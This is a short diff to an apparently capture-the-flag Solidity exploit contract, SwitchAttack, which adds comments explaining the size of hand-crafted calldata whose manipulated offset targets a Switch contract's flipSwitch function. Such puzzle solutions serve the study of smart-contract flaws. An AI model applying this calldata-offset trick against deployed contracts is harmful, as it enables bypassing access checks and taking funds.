@@ -16,6 +16,8 @@ contract SwitchAttack {
 
     function attack() external {
         (bool ok, ) = switchAddress.call(
+            // Don't forget. All section is allocated 32 bytes (Except first selector).
+            // Total size : 4 + 32 * 5 = 164 bytes
             abi.encodePacked(
                 Switch.flipSwitch.selector,         // flipSwitch Selector (4 bytes)
                 abi.encode(96),                     // Calldata offset (32 bytes)
